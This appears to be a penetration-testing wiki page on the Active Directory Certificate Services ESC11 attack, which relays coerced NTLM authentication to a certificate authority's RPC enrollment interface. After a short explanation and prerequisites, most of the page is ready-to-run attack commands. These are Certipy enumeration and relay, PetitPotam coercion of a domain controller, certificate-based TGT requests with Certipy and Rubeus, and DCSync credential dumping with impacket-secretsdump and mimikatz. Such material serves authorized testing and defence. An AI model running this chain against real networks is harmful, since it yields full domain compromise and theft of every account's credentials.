# ESC11

{% hint style="info" %}
NTLM relay to RPC enrolment endpoints
{% endhint %}

## Why It Works

* This is the **RPC-based sibling of ESC8**. Instead of relaying coerced NTLM authentication to the HTTP web enrollment endpoint (`/certsrv`), ESC11 relays it to the CA's **RPC enrollment interface** (MS-ICPR / `ICertPassage`).
* By default the CA can be configured with `IF_ENFORCEENCRYPTICERTREQUEST` **disabled**, meaning RPC requests to the enrollment interface don't require encryption/signing - which allows an NTLM relay attack over RPC to succeed the same way ESC8 works over HTTP.
* Outcome is identical to ESC8: relay a coerced machine account's auth to the CA, receive a valid Client Auth certificate for that machine account, then use PKINIT + DCSync for full domain compromise - just via a different transport/protocol.

## Prerequisites

* CA's RPC enrollment interface reachable, with `IF_ENFORCEENCRYPTICERTREQUEST` not enforced (check via `certipy find`'s "Enforce Encryption for Requests" field).
* A coercion primitive to force a target machine account to authenticate to the attacker.

## Enumerate

{% code lineNumbers="true" %}
```bash
certipy find -u <user>@<domain> -p <password> -dc-ip <DC-IP> -vulnerable -stdout
## Look for CA field 'Enforce Encryption for Requests: False' / ESC11 flagged
```
{% endcode %}

## Exploit

{% tabs %}
{% tab title="Certipy" %}
{% code lineNumbers="true" %}
```bash
## 1. Start an NTLM relay targeting the CA's RPC enrollment interface
certipy relay -ca <CA-IP> -template DomainController
## 2. Coerce the target machine account to authenticate to the attacker host
python3 PetitPotam.py <attacker-IP> <target-DC-IP>
## 3. Use the relayed certificate to request a TGT and DCSync
certipy auth -pfx <dc-machine>.pfx -dc-ip <DC-IP>
impacket-secretsdump -k -no-pass <domain>/<dc-machine>@<dc-fqdn>
```
{% endcode %}
{% endtab %}

{% tab title="Rubeus + Mimikatz" %}
{% hint style="info" %}
**Tool availability note:** Like ESC8, the relay step (`certipy relay`) requires impacket-based tooling and has **no Windows-native equivalent** - relaying must be run from a Linux attack box. Once you have the resulting `.pfx`, the final TGT request and DCSync can be finished on Windows instead:
{% endhint %}

{% code lineNumbers="true" %}
```bat
Rubeus.exe asktgt /user:<dc-machine>$ /certificate:<dc-machine>.pfx /ptt
mimikatz # lsadump::dcsync /domain:<domain> /user:administrator
```
{% endcode %}
{% endtab %}
{% endtabs %}
